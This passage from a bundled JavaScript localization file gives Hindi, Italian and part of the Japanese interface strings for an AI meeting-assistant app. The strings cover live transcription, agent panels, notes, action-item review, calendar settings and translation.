उन्हें सही लिखेगी\",\"highlight_4\":\"कुछ भी फ़ाइल होने से पहले निकाले गए ऐक्शन आइटम की समीक्षा करो — बेकार को आर्काइव करो, बाकी को फ़ाइल करो\",\"highlight_5\":\"प्लग करने योग्य टास्क और कैलेंडर प्रोवाइडर: एक लोकल टास्क लेजर और iCalendar (.ics) रीडर साथ आता है, और कोई संस्था अपना भी रजिस्टर कर सकती है\",\"highlight_6\":\"मीटिंग चलते हुए ट्रांसक्रिप्ट को दूसरी भाषा में पंक्ति-दर-पंक्ति पढ़ो\",\"highlight_7\":\"एजेंटों के नोट्स के साथ अपने खुद के नोट्स रखो — स्क्रीनशॉट पेस्ट करो और वह मीटिंग के बीते समय के साथ जुड़ जाता है\",\"page_label\":\"मीटिंग्स\",\"use_case_1\":\"लाइव मीटिंग रिकॉर्ड करें, जबकि समानांतर एजेंट ट्रांसक्रिप्ट, संरचित नोट्स, डायग्राम और समीक्षा योग्य action item बनाएँ।\"},\"meeting\":{\"agentsPaused\":\"बार-बार विफल होने के बाद एजेंट रुक गए।\",\"attachPrompt\":\"एजेंट के साथ साझा करने के लिए लिंक चिपकाएँ\",\"back\":\"वापस\",\"endAndReview\":\"समाप्त करें और समीक्षा करें\",\"ended\":\"समाप्त\",\"endingReview\":\"समाप्त हो रहा है — समीक्षा तैयार हो रही है…\",\"live\":\"चल रही\",\"loadFailed\":\"यह मीटिंग खुल नहीं सकी\",\"moreActions\":\"और कार्रवाइयां\",\"noAgents\":\"कोई एजेंट सक्रिय नहीं\",\"noAgentsHint\":\"ऊपर की पट्टी से किसी को चालू करें, या कोई प्रीसेट चुनें।\",\"pause\":\"रोकें\",\"paused\":\"रुकी हुई\",\"pausing\":\"रोका जा रहा है…\",\"refresh\":\"ताज़ा करें\",\"restart\":\"फिर से शुरू करें\",\"resuming\":\"जारी रखा जा रहा है…\",\"retryAgents\":\"पुनः प्रयास करें\",\"start\":\"शुरू करें\",\"titleLabel\":\"मीटिंग का शीर्षक\",\"toggleNote\":\"मेरा नोट\",\"toggleTasks\":\"कार्य-बिंदु\",\"toggleTranslation\":\"अनुवाद\",\"unpause\":\"जारी रखें\"},\"note\":{\"close\":\"नोट बंद करो\",\"edit\":\"संपादित करो\",\"editorLabel\":\"नोट का पाठ\",\"hint\":\"लिखते-लिखते अपने आप सहेजा जाता है।\",\"loadFailed\":\"तुम्हारा नोट डिस्क से पढ़ा नहीं जा सका। कुछ भी ओवरराइट न हो, इसलिए संपादन रोक दिया गया है — फिर से कोशिश करने के लिए पैनल बंद करके दोबारा खोलो।\",\"loading\":\"तुम्हारा नोट लोड हो रहा है…\",\"paused\":\"संपादन रुका हुआ है\",\"placeholder\":\"अपने नोट यहाँ लिखें। Markdown काम करता है।\",\"preview\":\"पूर्वावलोकन\",\"saved\":\"सहेजा गया\",\"saving\":\"सहेजा जा रहा है…\",\"title\":\"मेरा नोट\",\"unsaved\":\"बिना सहेजे बदलाव\",\"uploading\":\"छवि जोड़ी जा रही है…\"},\"pillBar\":{\"addLink\":\"लिंक जोड़ें\",\"agentMuted\":\"{{name}} सुन नहीं रहा है\",\"attachmentsMenu\":\"अनुलग्नक\",\"createPreset\":\"प्रीसेट बनाएँ\",\"disableAgent\":\"{{name}} को बंद करें\",\"enableAgent\":\"{{name}} को चालू करें\",\"listening\":\"सुन रहा है\",\"manageAgents\":\"एजेंट प्रबंधित करें\",\"manageAttachments\":\"अनुलग्नक प्रबंधित करें\",\"noAttachments\":\"कोई अनुलग्नक नहीं\",\"noPreset\":\"कोई प्रीसेट नहीं\",\"presetDefaultOption\":\"{{name}} (डिफ़ॉल्ट)\",\"presetLabel\":\"एजेंट प्रीसेट\",\"removeAttachment\":\"{{label}} हटाएँ\",\"usingDefaultPreset\":\"डिफ़ॉल्ट प्रीसेट का उपयोग हो रहा है\"},\"priority\":{\"high\":\"उच्च\",\"low\":\"निम्न\",\"medium\":\"मध्यम\"},\"review\":{\"allDone\":\"सब समीक्षित\",\"archive\":\"संग्रहित करें\",\"archiveAll\":\"बाकी संग्रहित करें\",\"archiveOthers_one\":\"बाकी {{count}} संग्रहित करो\",\"archiveOthers_other\":\"बाकी {{count}} संग्रहित करो\",\"archiveSkipsFiling\":\"जो आइटम फ़ाइल हो रहे हैं, वे छोड़ दिए जाते हैं\",\"archivedSection\":\"संग्रहित\",\"assignedTo\":\"{{name}} को सौंपा गया\",\"backToMeeting\":\"मीटिंग पर लौटें\",\"closeBlocked_one\":\"{{count}} पर अभी निर्णय बाकी है\",\"closeBlocked_other\":\"{{count}} पर अभी निर्णय बाकी है\",\"closeMeeting\":\"मीटिंग बंद करें\",\"file\":\"दर्ज करें\",\"filedSection\":\"{{provider}} में दर्ज\",\"filing\":\"दर्ज हो रहा है…\",\"nothingPending\":\"समीक्षा के लिए कुछ नहीं बचा\",\"nothingPendingHint\":\"हर कार्य-बिंदु दर्ज या संग्रहित हो गया है।\",\"pendingSection\":\"लंबित\",\"remaining_one\":\"{{count}} की समीक्षा बाकी\",\"remaining_other\":\"{{count}} की समीक्षा बाकी\",\"statArchived\":\"संग्रहित\",\"statFiled\":\"दर्ज\",\"statPending\":\"लंबित\",\"title\":\"कार्य-बिंदु समीक्षा\",\"unarchive\":\"पुनर्स्थापित करें\"},\"session\":{\"agentToggleFailed\":\"उस एजेंट को बदला नहीं जा सका।\",\"agentsResumed\":\"एजेंट फिर से चल रहे हैं।\",\"anotherMeetingActive\":\"एक और मीटिंग पहले से चल रही है। पहले उसे समाप्त करें।\",\"anotherMeetingActiveNamed\":\"“{{title}}” अभी चल रही है। उसे मीटिंग्स में खोलो और पहले उसे समाप्त करो।\",\"anotherMeetingReviewing\":\"“{{title}}” अभी समीक्षा में है। उसे मीटिंग्स में खोलो और पहले मीटिंग बंद करो।\",\"attachmentFailed\":\"अनुलग्नक अपडेट नहीं हो सके।\",\"broadcastFailed\":\"एजेंटों तक नहीं पहुँचा जा सका।\",\"broadcastSent\":\"सुन रहे एजेंटों को भेज दिया गया।\",\"ended\":\"मीटिंग समाप्त हुई।\",\"messageFailed\":\"वह संदेश नहीं भेजा जा सका।\",\"minutesRevertFailed\":\"तुम्हारे बदलाव छोड़े नहीं जा सके।\",\"minutesSaveFailed\":\"तुम्हारे बदलाव सहेजे नहीं जा सके।\",\"noteImageFailed\":\"वह छवि जोड़ी नहीं जा सकी। PNG, JPEG, GIF या WebP चिपकाओ।\",\"noteImageTooLarge\":\"वह छवि नोट में जोड़ने के लिए बहुत बड़ी है।\",\"noteSaveFailed\":\"नोट सहेजा नहीं जा सका।\",\"openVoiceSettings\":\"वॉइस सेटिंग्स खोलो\",\"renameFailed\":\"मीटिंग का नाम नहीं बदला जा सका।\",\"startFailed\":\"मीटिंग शुरू नहीं हो सकी।\",\"started\":\"मीटिंग शुरू हुई।\",\"statusFailed\":\"मीटिंग की स्थिति बदली नहीं जा सकी।\",\"stopFailed\":\"मीटिंग समाप्त नहीं हो सकी।\",\"sttConnectionFailed\":\"वाक्-लेखन से कनेक्ट नहीं हो सका।\",\"sttDisconnected\":\"वाक्-लेखन का कनेक्शन टूट गया।\",\"sttDispatchFailed\":\"एक ट्रांसक्रिप्ट खंड एजेंट तक नहीं पहुँचाया जा सका।\",\"sttMicDenied\":\"माइक्रोफ़ोन की अनुमति नहीं मिली।\",\"sttStreamingDisabled\":\"लाइव ट्रांसक्रिप्शन बंद है। सेटिंग्स → वॉइस में जाँचो कि वॉइस इनपुट चालू है, प्रदाता स्ट्रीमिंग सपोर्ट करता है, और स्ट्रीमिंग चालू है।\",\"sttUnavailable\":\"वाक्-लेखन उपलब्ध नहीं है।\",\"sttUnsupported\":\"यह ब्राउज़र ऑडियो रिकॉर्ड नहीं कर सकता।\",\"sttWorkletFailed\":\"ऑडियो प्रोसेसर शुरू नहीं हो सका।\",\"taskAddFailed\":\"वह कार्य-बिंदु जोड़ा नहीं जा सका।\",\"taskFileFailed\":\"वह कार्य-बिंदु दर्ज नहीं हो सका।\",\"taskFiled\":\"कार्य-बिंदु दर्ज हुआ।\",\"untitled\":\"बिना शीर्षक मीटिंग\"},\"settings\":{\"addTerm\":\"जोड़ें\",\"agentsHelp\":\"मीटिंग में कौन-से एजेंट उपलब्ध हों, और उनमें से कौन शुरू से सक्रिय रहें।\",\"agentsTitle\":\"एजेंट\",\"aliasesLabel\":\"गलत सुने गए रूप\",\"aliasesPlaceholder\":\"वाक्-लेखन जो सुनता है, अल्पविराम से अलग करके…\",\"back\":\"वापस\",\"calendarHelp\":\"आगामी मीटिंग कहाँ से पढ़ी जाती हैं।\",\"calendarProviderLabel\":\"कैलेंडर प्रदाता\",\"calendarSourceHint\":\"किसी स्थानीय .ics फ़ाइल का पथ, या उस तक जाने वाला https URL।\",\"calendarSourceLabel\":\"कैलेंडर स्रोत\",\"calendarSourcePlaceholder\":\".ics फ़ाइल का पथ या URL…\",\"calendarTitle\":\"कैलेंडर\",\"correctLabel\":\"सही शब्द\",\"correctPlaceholder\":\"जो लिखा जाना चाहिए…\",\"dictionaryHelp\":\"वाक्-लेखन की बार-बार होने वाली गलती एक बार ठीक करें, फिर हर आगामी मीटिंग में वह सही लिखी जाएगी।\",\"dictionaryTitle\":\"वाक् शब्दकोश\",\"enabledByDefault\":\"{{name}} को डिफ़ॉल्ट रूप से चालू रखें\",\"noTerms\":\"अभी कोई सुधार नहीं\",\"noTermsHint\":\"बाईं ओर लिखें कि वाक्-लेखन क्या गलत सुनता है, और दाईं ओर क्या लिखा जाना चाहिए।\",\"removeTerm\":\"{{term}} हटाएँ\",\"saveFailed\":\"सेटिंग्स सहेजी नहीं जा सकीं।\",\"saveSource\":\"सहेजें\",\"saved\":\"सहेजा गया।\",\"subtitle\":\"प्रदाता, एजेंट और वाक् शब्दकोश\",\"taskProviderHelp\":\"समीक्षित कार्य-बिंदु कहाँ दर्ज किए जाते हैं।\",\"taskProviderTitle\":\"कार्य प्रदाता\",\"termFailed\":\"वह सुधार जोड़ा नहीं जा सका।\",\"termIncomplete\":\"जो सुना गया और जो लिखा जाना चाहिए, दोनों भरें।\",\"title\":\"मीटिंग सेटिंग्स\",\"translationHelp\":\"हर बोली गई पंक्ति का दूसरी भाषा में अनुवाद करता है और मीटिंग के दौरान साइड पैनल में दिखाता है। हर पंक्ति पर एक मॉडल कॉल लगती है, इसलिए यह डिफ़ॉल्ट रूप से बंद है।\",\"translationOff\":\"बंद\",\"translationTitle\":\"लाइव अनुवाद\"},\"taskSidebar\":{\"add\":\"जोड़ें\",\"assigneeLabel\":\"जिम्मेदार व्यक्ति\",\"close\":\"कार्य-बिंदु बंद करें\",\"deleteTask\":\"यह कार्य-बिंदु हटाएँ\",\"descriptionLabel\":\"कार्य-बिंदु\",\"empty\":\"अभी कुछ नहीं निकाला गया।\",\"filed\":\"दर्ज\",\"heading_one\":\"{{count}} कार्य-बिंदु\",\"heading_other\":\"{{count}} कार्य-बिंदु\",\"priorityLabel\":\"प्राथमिकता\",\"quickAddPlaceholder\":\"कार्य-बिंदु जोड़ें…\",\"title\":\"कार्य-बिंदु\",\"unassigned\":\"किसी को नहीं सौंपा\"},\"transcript\":{\"empty\":\"अभी कोई प्रतिलेख नहीं\",\"emptyHintLive\":\"मीटिंग आगे बढ़ने पर अंतिम भाषण यहाँ दिखाई देगा।\",\"emptyHintPaused\":\"रुका हुआ — फिर से शुरू करने पर बोली यहां दिखेगी।\",\"emptyHintRecorded\":\"इस मीटिंग के लिए कोई प्रतिलेख रिकॉर्ड नहीं किया गया।\",\"full\":\"प्रतिलेख भर गया है। नई आवाज़ और प्रसारण अब रिकॉर्ड नहीं होंगे या एजेंटों को नहीं भेजे जाएंगे।\",\"jumpToLatest\":\"सबसे नए पर जाएँ\",\"live\":\"लाइव\",\"regionLabel\":\"मीटिंग का प्रतिलेख\",\"title\":\"प्रतिलेख\",\"typed\":\"टाइप किया गया\"},\"translation\":{\"close\":\"अनुवाद बंद करें\",\"dropped\":\"गति बनाए रखने के लिए कुछ पंक्तियाँ छोड़ी गईं।\",\"empty\":\"अभी कुछ अनुवादित नहीं हुआ\",\"emptyHint\":\"बोलने के साथ-साथ पंक्तियाँ यहाँ दिखेंगी।\",\"lineFailed\":\"इस पंक्ति का अनुवाद नहीं हो सका।\",\"loading\":\"लोड हो रहा है…\",\"pending\":\"पीछे छूटा हिस्सा पूरा हो रहा है…\",\"title\":\"अनुवाद\"},\"widgetType\":{\"chat\":\"चैट\",\"html\":\"आरेख\",\"markdown\":\"नोट्स\"}}}"),
		components: { "confirmDialog": { "cancel": "रद्द करें" } }
	},
	it: {
		apps: /* @__PURE__ */ JSON.parse("{\"meetings\":{\"agentPanel\":{\"awaitingOutput\":\"L’output di {{name}} apparirà qui.\",\"cancel\":\"Annulla\",\"chatEmpty\":\"Non è stato ancora inviato nulla a {{name}}.\",\"collapse\":\"Ripristina {{name}} nel layout affiancato\",\"diagramFrameTitle\":\"Diagramma di {{name}}\",\"discardDraft\":\"Scarta le modifiche non salvate\",\"discardDraftHint\":\"Le modifiche non salvate verranno eliminate definitivamente.\",\"edit\":\"Modifica questo output\",\"edited\":\"Modificato\",\"editorLabel\":\"Output di {{name}}, modificabile\",\"expand\":\"Espandi {{name}}\",\"listeningHint\":\"Sta ascoltando la riunione\",\"messagePlaceholder\":\"Messaggio per {{name}}…\",\"mute\":\"Silenzia {{name}}\",\"mutedHint\":\"Non sta ascoltando la riunione\",\"revert\":\"Scarta le mie modifiche\",\"revertHint\":\"Elimina definitivamente le mie modifiche e mostra ciò che ha scritto {{name}}\",\"save\":\"Salva\",\"saving\":\"Salvataggio…\",\"send\":\"Invia\",\"showChat\":\"Mostra la chat\",\"showOutput\":\"Mostra l’output\",\"staleEdit\":\"{{name}} ha scritto altro da quando hai modificato questo testo. È mostrata la tua versione; scarta le tue modifiche per vedere la sua.\",\"unmute\":\"Riattiva {{name}}\"},\"broadcastBar\":{\"heard\":\"Sentito: {{text}}\",\"pausedPlaceholder\":\"Agenti in pausa — riprendi per inviare\",\"pausingPlaceholder\":\"Messa in pausa — invio non disponibile\",\"placeholder\":\"Dì qualcosa a tutti gli agenti in ascolto…\",\"resumingPlaceholder\":\"Ripresa in corso — l'invio sarà presto disponibile\",\"send\":\"Invia\"},\"list\":{\"adHocTitle\":\"Riunione improvvisata\",\"deleteConfirm\":\"Eliminare «{{title}}» e tutti i relativi appunti, diagrammi e azioni? Questa operazione non può essere annullata.\",\"deleteFailed\":\"Non è stato possibile eliminare questa riunione.\",\"deleteMeeting\":\"Elimina {{title}}\",\"deleteUnavailable\":\"Termina questa riunione prima di eliminarla\",\"deleted\":\"“{{title}}” è stata eliminata\",\"empty\":\"Nessuna riunione\",\"emptyHintNoCalendar\":\"Collega un calendario nelle impostazioni, oppure avvia una riunione improvvisata.\",\"emptyHintSynced\":\"Niente in calendario, e nessuna riunione ancora lavorata.\",\"filterPlaceholder\":\"Filtra le riunioni…\",\"hasNotes\":\"Ha appunti\",\"liveBanner\":\"{{title}} è in corso\",\"newMeeting\":\"Nuova riunione\",\"returnToMeeting\":\"Torna alla riunione\",\"reviewing\":\"In revisione\",\"reviewingBanner\":\"{{title}} attende la revisione delle azioni\",\"sectionTitle\":\"Tutte le riunioni\",\"settings\":\"Impostazioni\",\"statLive\":\"In corso\",\"statScheduled\":\"In programma\",\"statWorked\":\"Lavorate\",\"subtitle\":\"Appunti, diagrammi e azioni dal vivo mentre la riunione va avanti\",\"syncCalendar\":\"Sincronizza il calendario\",\"syncFailed\":\"Non è stato possibile sincronizzare il calendario.\",\"synced_many\":\"{{count}} eventi sincronizzati\",\"synced_one\":\"{{count}} evento sincronizzato\",\"synced_other\":\"{{count}} eventi sincronizzati\",\"title\":\"Riunioni\"},\"manifest\":{\"configuration_1\":\"Consenti al browser di accedere al microfono per l'acquisizione dal vivo; configura facoltativamente nelle Impostazioni un percorso o URL iCalendar, il registro attività locale, i ruoli agente e i termini di correzione vocale.\",\"description\":\"Un assistente AI per le riunioni. Trascrive la riunione dal vivo, tiene note e diagrammi strutturati mentre procede, estrae le azioni da fare e ti lascia rivederle prima di registrarle.\",\"display_name\":\"Riunioni\",\"highlight_1\":\"Trascrizione dal vivo con il riconoscimento vocale integrato di Kiro Crew — nessun daemon aggiuntivo, nessun account cloud oltre a quelli che usi già\",\"highlight_2\":\"Un gruppo di agenti lavora sulla riunione in parallelo: note strutturate, un diagramma HTML/Mermaid e un elenco di azioni da fare\",\"highlight_3\":\"Correggi una volta sola gli errori ricorrenti del riconoscimento vocale con un dizionario di dominio e tutte le riunioni successive li scriveranno bene\",\"highlight_4\":\"Rivedi le azioni estratte prima che qualcosa venga registrato — archivia il rumore, registra il resto\",\"highlight_5\":\"Provider di attività e calendario collegabili: include un registro locale delle attività e un lettore iCalendar (.ics), e un’organizzazione può registrarne di propri\",\"highlight_6\":\"Rileggi la trascrizione riga per riga in un'altra lingua mentre la riunione è in corso\",\"highlight_7\":\"Tieni i tuoi appunti accanto a quelli degli agenti — incolla uno screenshot e viene salvato con il tempo trascorso della riunione\",\"page_label\":\"Riunioni\",\"use_case_1\":\"Acquisisci una riunione dal vivo mentre agenti paralleli creano la trascrizione, le note strutturate, il diagramma e la revisione delle attività.\"},\"meeting\":{\"agentsPaused\":\"Gli agenti si sono fermati dopo ripetuti errori.\",\"attachPrompt\":\"Incolla un link da condividere con gli agenti\",\"back\":\"Indietro\",\"endAndReview\":\"Termina e passa in revisione\",\"ended\":\"Terminata\",\"endingReview\":\"Chiusura — preparazione della revisione…\",\"live\":\"In corso\",\"loadFailed\":\"Non è stato possibile aprire questa riunione\",\"moreActions\":\"Altre azioni\",\"noAgents\":\"Nessun agente attivo\",\"noAgentsHint\":\"Attivane uno nella barra qui sopra, oppure scegli un preset.\",\"pause\":\"Metti in pausa\",\"paused\":\"In pausa\",\"pausing\":\"Messa in pausa…\",\"refresh\":\"Aggiorna\",\"restart\":\"Riavvia\",\"resuming\":\"Ripresa in corso…\",\"retryAgents\":\"Riprova\",\"start\":\"Avvia\",\"titleLabel\":\"Titolo della riunione\",\"toggleNote\":\"La mia nota\",\"toggleTasks\":\"Azioni da fare\",\"toggleTranslation\":\"Traduzione\",\"unpause\":\"Riprendi\"},\"note\":{\"close\":\"Chiudi la nota\",\"edit\":\"Modifica\",\"editorLabel\":\"Testo della nota\",\"hint\":\"Viene salvata automaticamente mentre scrivi.\",\"loadFailed\":\"Non è stato possibile leggere la tua nota dal disco. La modifica è in pausa per non sovrascrivere nulla: chiudi e riapri il pannello per riprovare.\",\"loading\":\"Caricamento della tua nota…\",\"paused\":\"Modifica in pausa\",\"placeholder\":\"Scrivi qui i tuoi appunti. Markdown è supportato.\",\"preview\":\"Anteprima\",\"saved\":\"Salvata\",\"saving\":\"Salvataggio…\",\"title\":\"La mia nota\",\"unsaved\":\"Modifiche non salvate\",\"uploading\":\"Aggiunta dell'immagine…\"},\"pillBar\":{\"addLink\":\"Aggiungi un link\",\"agentMuted\":\"{{name}} non è in ascolto\",\"attachmentsMenu\":\"Allegati\",\"createPreset\":\"Crea un preset\",\"disableAgent\":\"Disattiva {{name}}\",\"enableAgent\":\"Attiva {{name}}\",\"listening\":\"In ascolto\",\"manageAgents\":\"Gestisci gli agenti\",\"manageAttachments\":\"Gestisci gli allegati\",\"noAttachments\":\"Nessun allegato\",\"noPreset\":\"Nessun preset\",\"presetDefaultOption\":\"{{name}} (predefinito)\",\"presetLabel\":\"Preset di agenti\",\"removeAttachment\":\"Rimuovi {{label}}\",\"usingDefaultPreset\":\"Si usa il preset predefinito\"},\"priority\":{\"high\":\"Alta\",\"low\":\"Bassa\",\"medium\":\"Media\"},\"review\":{\"allDone\":\"Tutto rivisto\",\"archive\":\"Archivia\",\"archiveAll\":\"Archivia il resto\",\"archiveOthers_many\":\"Archivia le altre {{count}}\",\"archiveOthers_one\":\"Archivia l’altra {{count}}\",\"archiveOthers_other\":\"Archivia le altre {{count}}\",\"archiveSkipsFiling\":\"Gli elementi in fase di registrazione vengono saltati\",\"archivedSection\":\"Archiviate\",\"assignedTo\":\"Assegnata a {{name}}\",\"backToMeeting\":\"Torna alla riunione\",\"closeBlocked_many\":\"{{count}} attendono ancora una decisione\",\"closeBlocked_one\":\"{{count}} attende ancora una decisione\",\"closeBlocked_other\":\"{{count}} attendono ancora una decisione\",\"closeMeeting\":\"Chiudi la riunione\",\"file\":\"Registra\",\"filedSection\":\"Registrate in {{provider}}\",\"filing\":\"Registrazione…\",\"nothingPending\":\"Non c’è più nulla da rivedere\",\"nothingPendingHint\":\"Ogni azione è stata registrata o archiviata.\",\"pendingSection\":\"In sospeso\",\"remaining_many\":\"ne restano {{count}} da rivedere\",\"remaining_one\":\"ne resta {{count}} da rivedere\",\"remaining_other\":\"ne restano {{count}} da rivedere\",\"statArchived\":\"Archiviate\",\"statFiled\":\"Registrate\",\"statPending\":\"In sospeso\",\"title\":\"Revisione delle azioni\",\"unarchive\":\"Ripristina\"},\"session\":{\"agentToggleFailed\":\"Non è stato possibile modificare quell’agente.\",\"agentsResumed\":\"Gli agenti sono di nuovo attivi.\",\"anotherMeetingActive\":\"C’è già un’altra riunione in corso. Terminala prima.\",\"anotherMeetingActiveNamed\":\"«{{title}}» è ancora in corso. Aprila in Riunioni e scegli prima «Termina e passa in revisione».\",\"anotherMeetingReviewing\":\"«{{title}}» è ancora in revisione. Aprila in Riunioni e scegli prima «Chiudi la riunione».\",\"attachmentFailed\":\"Non è stato possibile aggiornare gli allegati.\",\"broadcastFailed\":\"Non è stato possibile raggiungere gli agenti.\",\"broadcastSent\":\"Inviato agli agenti in ascolto.\",\"ended\":\"Riunione terminata.\",\"messageFailed\":\"Non è stato possibile inviare quel messaggio.\",\"minutesRevertFailed\":\"Non è stato possibile scartare le tue modifiche.\",\"minutesSaveFailed\":\"Non è stato possibile salvare le tue modifiche.\",\"noteImageFailed\":\"Non è stato possibile aggiungere quell'immagine. Incolla un PNG, JPEG, GIF o WebP.\",\"noteImageTooLarge\":\"Quell'immagine è troppo grande per una nota.\",\"noteSaveFailed\":\"Non è stato possibile salvare la tua nota.\",\"openVoiceSettings\":\"Apri impostazioni voce\",\"renameFailed\":\"Non è stato possibile rinominare la riunione.\",\"startFailed\":\"Non è stato possibile avviare la riunione.\",\"started\":\"Riunione avviata.\",\"statusFailed\":\"Non è stato possibile cambiare lo stato della riunione.\",\"stopFailed\":\"Non è stato possibile terminare la riunione.\",\"sttConnectionFailed\":\"Non è stato possibile collegarsi alla trascrizione.\",\"sttDisconnected\":\"La trascrizione si è disconnessa.\",\"sttDispatchFailed\":\"Non è stato possibile inviare agli agenti un segmento della trascrizione.\",\"sttMicDenied\":\"L’accesso al microfono è stato negato.\",\"sttStreamingDisabled\":\"La trascrizione dal vivo è disattivata. In Impostazioni → Voce, verifica che l'input vocale sia attivo, che il provider supporti lo streaming e che Streaming sia attivo.\",\"sttUnavailable\":\"La trascrizione non è disponibile.\",\"sttUnsupported\":\"Questo browser non può registrare l’audio.\",\"sttWorkletFailed\":\"Non è stato possibile avviare l’elaborazione audio.\",\"taskAddFailed\":\"Non è stato possibile aggiungere quell’azione.\",\"taskFileFailed\":\"Non è stato possibile registrare quell’azione.\",\"taskFiled\":\"Azione registrata.\",\"untitled\":\"Riunione senza titolo\"},\"settings\":{\"addTerm\":\"Aggiungi\",\"agentsHelp\":\"Quali agenti una riunione mette a disposizione, e quali partono attivi.\",\"agentsTitle\":\"Agenti\",\"aliasesLabel\":\"Forme sentite male\",\"aliasesPlaceholder\":\"Ciò che sente la trascrizione, separato da virgole…\",\"back\":\"Indietro\",\"calendarHelp\":\"Da dove vengono lette le riunioni in arrivo.\",\"calendarProviderLabel\":\"Provider di calendario\",\"calendarSourceHint\":\"Un percorso a un file .ics locale, oppure un URL https che punta a uno.\",\"calendarSourceLabel\":\"Origine del calendario\",\"calendarSourcePlaceholder\":\"Percorso o URL di un file .ics…\",\"calendarTitle\":\"Calendario\",\"correctLabel\":\"Termine corretto\",\"correctPlaceholder\":\"Come dovrebbe dire…\",\"dictionaryHelp\":\"Correggi una volta un errore ricorrente di trascrizione e tutte le riunioni successive lo scriveranno bene.\",\"dictionaryTitle\":\"Dizionario vocale\",\"enabledByDefault\":\"Attiva {{name}} per impostazione predefinita\",\"noTerms\":\"Ancora nessuna correzione\",\"noTermsHint\":\"A sinistra scrivi ciò che la trascrizione sente male, a destra come dovrebbe dire.\",\"removeTerm\":\"Rimuovi {{term}}\",\"saveFailed\":\"Non è stato possibile salvare le impostazioni.\",\"saveSource\":\"Salva\",\"saved\":\"Salvato.\",\"subtitle\":\"Provider, agenti e dizionario vocale\",\"taskProviderHelp\":\"Dove vengono registrate le azioni riviste.\",\"taskProviderTitle\":\"Provider delle attività\",\"termFailed\":\"Non è stato possibile aggiungere quella correzione.\",\"termIncomplete\":\"Inserisci ciò che è stato sentito e come dovrebbe dire.\",\"title\":\"Impostazioni di Riunioni\",\"translationHelp\":\"Traduce ogni riga parlata in un'altra lingua, mostrata in un pannello laterale durante la riunione. Consuma una chiamata al modello per riga, quindi è disattivata per impostazione predefinita.\",\"translationOff\":\"Disattivata\",\"translationTitle\":\"Traduzione in tempo reale\"},\"taskSidebar\":{\"add\":\"Aggiungi\",\"assigneeLabel\":\"Assegnataria\",\"close\":\"Chiudi le azioni\",\"deleteTask\":\"Elimina questa azione\",\"descriptionLabel\":\"Azione da fare\",\"empty\":\"Non è stato ancora estratto nulla.\",\"filed\":\"Registrata\",\"heading_many\":\"{{count}} azioni da fare\",\"heading_one\":\"{{count}} azione da fare\",\"heading_other\":\"{{count}} azioni da fare\",\"priorityLabel\":\"Priorità\",\"quickAddPlaceholder\":\"Aggiungi un’azione…\",\"title\":\"Azioni da fare\",\"unassigned\":\"Non assegnata\"},\"transcript\":{\"empty\":\"Nessuna trascrizione per ora\",\"emptyHintLive\":\"Il parlato definitivo apparirà qui durante la riunione.\",\"emptyHintPaused\":\"In pausa — il parlato apparirà qui dopo la ripresa.\",\"emptyHintRecorded\":\"Non è stata registrata alcuna trascrizione per questa riunione.\",\"full\":\"La trascrizione è piena. Nuovi interventi e messaggi non verranno più registrati né inviati agli agenti.\",\"jumpToLatest\":\"Vai al contenuto più recente\",\"live\":\"Live\",\"regionLabel\":\"Trascrizione della riunione\",\"title\":\"Trascrizione\",\"typed\":\"Digitato\"},\"translation\":{\"close\":\"Chiudi la traduzione\",\"dropped\":\"Alcune righe sono state saltate per stare al passo.\",\"empty\":\"Ancora nulla di tradotto\",\"emptyHint\":\"Le righe compaiono qui mentre si parla.\",\"lineFailed\":\"Non è stato possibile tradurre questa riga.\",\"loading\":\"Caricamento…\",\"pending\":\"Recupero in corso…\",\"title\":\"Traduzione\"},\"widgetType\":{\"chat\":\"Chat\",\"html\":\"Diagramma\",\"markdown\":\"Appunti\"}}}"),
		components: { "confirmDialog": { "cancel": "Annulla" } }
	},
	ja: {
		apps: /* @__PURE__ */ JSON.parse("{\"meetings\":{\"agentPanel\":{\"awaitingOutput\":\"{{name}}の出力はここに表示されます。\",\"cancel\":\"キャンセル\",\"chatEmpty\":\"{{name}}にはまだ何も送信されていません。\",\"collapse\":\"{{name}} を元の並列レイアウトに戻す\",\"diagramFrameTitle\":\"{{name}}ダイアグラム\",\"discardDraft\":\"未保存の変更を破棄\",\"discardDraftHint\":\"未保存の変更は完全に削除されます。\",\"edit\":\"この出力を編集\",\"edited\":\"編集済み\",\"editorLabel\":\"{{name}}の出力（編集可能）\",\"expand\":\"{{name}} を拡大\",\"listeningHint\":\"会議をリッスン中\",\"messagePlaceholder\":\"{{name}}にメッセージを送信…\",\"mute\":\"{{name}}をミュート\",\"mutedHint\":\"会議をリッスンしていません\",\"revert\":\"自分の編集を破棄\",\"revertHint\":\"自分の編集を完全に削除して{{name}}が書いた内容を表示\",\"save\":\"保存\",\"saving\":\"保存中…\",\"send\":\"送信\",\"showChat\":\"チャットを表示\",\"showOutput\":\"出力を表示\",\"staleEdit\":\"編集後に{{name}}がさらに書き込みました。表示されているのはあなたの版です。エージェント側の版を見るには編集を破棄してください。\",\"unmute\":\"{{name}}のミュートを解除\"},\"broadcastBar\":{\"heard\":\"聞き取り:{{text}}\",\"pausedPlaceholder\":\"エージェントは一時停止中 — 送信するには再開してください\",\"pausingPlaceholder\":\"一時停止中 — 送信できません\",\"placeholder\":\"すべてのリッスンしているエージェントに何かを言う…\",\"resumingPlaceholder\":\"再開中 — まもなく送信できます\",\"send\":\"送信\"},\"list\":{\"adHocTitle\":\"アドホック会議\",\"deleteConfirm\":\"「{{title}}」と、そのすべてのノート、図、アクションアイテムを削除しますか？この操作は取り消せません。\",\"deleteFailed\":\"この会議を削除できませんでした。\",\"deleteMeeting\":\"{{title}}を削除\",\"deleteUnavailable\":\"削除する前にこの会議を終了してください\",\"deleted\":\"「{{title}}」を削除しました\",\"empty\":\"会議なし\",\"emptyHintNoCalendar\":\"設定でカレンダーを接続するか、アドホック会議を開始してください。\",\"emptyHintSynced\":\"カレンダーに何もなく、まだ作業した会議もありません。\",\"filterPlaceholder\":\"会議をフィルタ…\",\"hasNotes\":\"ノートあり\",\"liveBanner\":\"{{title}}はライブです\",\"newMeeting\":\"新しい会議\",\"returnToMeeting\":\"会議に戻る\",\"reviewing\":\"確認中\",\"reviewingBanner\":\"{{title}}はアクションアイテムの確認待ちです\",\"sectionTitle\":\"すべての会議\",\"settings\":\"設定\",\"statLive\":\"ライブ\",\"statScheduled\":\"スケジュール済み\",\"statWorked\":\"作業済み\",\"subtitle\":\"会議中のライブノート、ダイアグラム、アクションアイテム\",\"syncCalendar\":\"カレンダーを同期\",\"syncFailed\":\"カレンダーを同期できませんでした。\",\"synced_other\":\"{{count}}個のイベントを同期\",\"title\":\"会議\"},\"manifest\":{